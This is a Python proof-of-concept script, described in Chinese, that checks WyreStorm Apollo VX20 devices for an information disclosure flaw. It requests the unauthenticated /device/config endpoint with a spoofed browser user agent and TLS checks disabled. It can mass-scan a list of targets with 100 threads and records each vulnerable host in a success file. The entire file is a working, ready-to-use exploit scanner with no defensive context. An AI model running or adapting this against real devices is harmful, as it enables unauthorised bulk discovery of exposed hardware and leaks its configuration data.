import argparse,sys,requests
from multiprocessing.dummy import Pool

requests.packages.urllib3.disable_warnings()

def banner():
    banner = """
       《《《《《WA_VX20》》》》》
"""
    print(banner)

def main():
    banner()
    parser = argparse.ArgumentParser(description='WyreStorm Apollo VX20 信息泄露漏洞')
    parser.add_argument('-u','--url',dest='url',type=str,help='please input url')
    parser.add_argument('-f','--file',dest='file',type=str,help='please input file')

    args = parser.parse_args()
    if args.url and not args.file:
        poc(args.url)
    elif not args.url and args.file:
        url_list = []
        with open(args.file,'r',encoding='utf-8') as fp:
            for i in fp.readlines():
                url_list.append(i.strip().replace('\n',''))
        mp = Pool(100)
        mp.map(poc,url_list)
        mp.close()
        mp.join()
    else:
        print(f"Useag:\n\t python {sys.argv[0]} -h")

def poc(target):
    payload = '/device/config'
    header = {
        'User-Agent': 'Mozilla/5.0 (Windows NT 4.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/37.0.2049.0 Safari/537.36',
        'Connection': 'close',
        'Accept': '*/*',
        'Accept-Language': 'en',
        'Accept-Encoding': 'gzip'

    }

    try:
        res = requests.get(url = target+payload,headers=header,verify=False,timeout=5)
        if res.status_code == 200:
            print(f"[+]该url{target}存在漏洞")
            with open("success.txt", "a+", encoding="utf-8") as f:
                f.write(target+"\n")
        else:
            print(f"[-]该url{target}不存在漏洞")
    except Exception as e:
        print(f"[*]该url{target}存在问题")



if __name__ ==  '__main__':
    main()